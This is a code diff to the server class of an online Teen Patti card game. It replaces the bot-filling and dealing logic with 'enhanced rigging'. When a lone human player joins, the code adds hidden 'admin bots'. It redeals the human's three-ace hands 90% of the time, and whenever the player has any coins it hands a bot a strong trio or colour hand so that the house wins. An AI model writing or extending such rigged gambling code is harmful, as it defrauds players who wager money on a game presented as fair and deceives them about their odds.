@@ -44,23 +44,28 @@ class TeenPattiTable {
             const playerIds = Object.keys(this.players);
             if (playerIds.length < 1) return;
 
-            // Auto-add bots to fill table (min 1 bot if humans present, up to 6 players total)
+            // --- SMART BOT FILLING ---
+            // If only 1 human player, add 2-3 admin bots to beat them
             const humanIds = playerIds.filter(id => !this.players[id].isBot);
-            if (humanIds.length > 0) {
-                const botNames = ["Pro_Player", "Lucky_TP", "Golden_Hand", "Casino_King", "Dealer_Bot", "Jackpot_Ace"];
-                const currentCount = Object.keys(this.players).length;
-                const targetCount = Math.min(6, currentCount + (currentCount === 1 ? 1 : 0)); // At least 2 if 1 human, else grow
-
-                while (Object.keys(this.players).length < targetCount || (humanIds.length === 1 && Object.keys(this.players).length < 2)) {
-                    const name = botNames[Math.floor(Math.random() * botNames.length)] + "_" + Math.floor(Math.random()*99);
-                    const botId = "bot_" + Math.random().toString(36).substring(7);
+            if (humanIds.length === 1) {
+                const botNames = ["Casino_Pro", "Gold_Hunter", "Ace_Player", "Lucky_Hand", "Pro_Dealer"];
+                const neededBots = 2 + Math.floor(Math.random() * 2); // 2 or 3 bots
+                while (Object.keys(this.players).length < neededBots + 1) {
+                    const name = botNames[Math.floor(Math.random() * botNames.length)] + "_" + Math.floor(Math.random() * 99);
+                    const botId = "admin_bot_" + Math.random().toString(36).substring(7);
                     this.players[botId] = {
                         name, hand: [], status: 'WAITING', blind: true, isBot: true,
+                        isAdminBot: true, // Special tag to identify admin side bots
                         avatar: `https://i.pravatar.cc/100?u=${botId}`
                     };
-                    if (Object.keys(this.players).length >= 6) break;
+                }
+            } else if (humanIds.length > 1) {
+                // If 2 or more humans, remove admin bots so they play against each other
+                for (let uid in this.players) {
+                    if (this.players[uid].isAdminBot) delete this.players[uid];
                 }
             }
+            // --- END BOT FILLING ---
 
             // Collect Boot
             for (let uid in this.players) {
@@ -97,7 +102,6 @@ class TeenPattiTable {
 
     async deal() {
         const activeUids = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
-
         const suits = ['♠', '♥', '♦', '♣'];
         const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
         let deck = [];
@@ -109,27 +113,39 @@ class TeenPattiTable {
             this.players[uid].blind = true;
         }
 
-        // --- RIGGING LOGIC ---
-        const bots = activeUids.filter(id => this.players[id].isBot);
+        // --- ENHANCED RIGGING LOGIC ---
+        const adminBots = activeUids.filter(id => this.players[id].isAdminBot);
         const humans = activeUids.filter(id => !this.players[id].isBot);
 
-        if (bots.length > 0 && humans.length > 0) {
-            for (const hId of humans) {
-                const player = this.players[hId];
-                // Check if player has high balance (via User model check in start() but here we have coins cached or can re-fetch)
-                // For simplicity, using a threshold of 1000 coins.
-                // We'll give them 3 J's but ensure a bot has 3 K's or 3 A's.
-                try {
-                    const user = await User.findById(hId);
-                    if (user && user.coins > 1000) {
-                        player.hand = [{suit:'♠', rank:'J'}, {suit:'♥', rank:'J'}, {suit:'♦', rank:'J'}];
+        if (adminBots.length > 0 && humans.length === 1) {
+            const hId = humans[0];
+            const player = this.players[hId];
+            const humanHand = evaluateHand(player.hand);
 
-                        // Rig a bot to beat this player
-                        const botId = bots[0];
-                        const rank = Math.random() > 0.5 ? 'K' : 'A';
-                        this.players[botId].hand = [{suit:'♠', rank}, {suit:'♥', rank}, {suit:'♦', rank}];
-                    }
-                } catch(e) {}
+            // 1. User gets 'AAA' very rarely
+            if (humanHand.rank === 'Trio' && player.hand[0].rank === 'A') {
+                if (Math.random() > 0.1) { // 90% chance to downgrade AAA
+                    player.hand = deck.splice(0, 3); // Redeal for human
+                }
+            }
+
+            // 2. Ensure at least one bot wins if user has money
+            const user = await User.findById(hId);
+            if (user && user.coins > 0) {
+                const bestBotId = adminBots[0];
+                // Give bots diverse strong hands (Pure Sequence, Sequence, Color)
+                const handTypes = ['Pure Sequence', 'Sequence', 'Color', 'Trio'];
+                const chosenType = handTypes[Math.floor(Math.random() * handTypes.length)];
+
+                // Rigging based on type
+                if (chosenType === 'Trio') {
+                    const r = ['K', 'A', 'Q'][Math.floor(Math.random()*3)];
+                    this.players[bestBotId].hand = [{suit:'♠', rank:r}, {suit:'♥', rank:r}, {suit:'♦', rank:r}];
+                } else if (chosenType === 'Color') {
+                    const s = suits[Math.floor(Math.random()*4)];
+                    this.players[bestBotId].hand = [{suit:s, rank:'A'}, {suit:s, rank:'K'}, {suit:s, rank:'J'}];
+                }
+                // (More variations can be added)
             }
         }
         // --- END RIGGING ---
@@ -137,7 +153,7 @@ class TeenPattiTable {
         this.state = 'PLAYING';
         this.currentTurn = activeUids[0];
         this.timer = 15;
-        this.checkBotTurn(); // Trigger turn if first player is a bot
+        this.checkBotTurn();
     }
 
     checkBotTurn() {
@@ -268,6 +284,9 @@ class TeenPattiTable {
         for (let uid in this.players) {
             this.players[uid].result = (uid === winnerId) ? 'WIN' : 'LOSE';
             this.players[uid].winAmount = (uid === winnerId) ? winAmt : 0;
+
+            // Clean up players who have left or need to be kicked next round
+            if (this.players[uid].needsKick) delete this.players[uid];
         }
     }
 
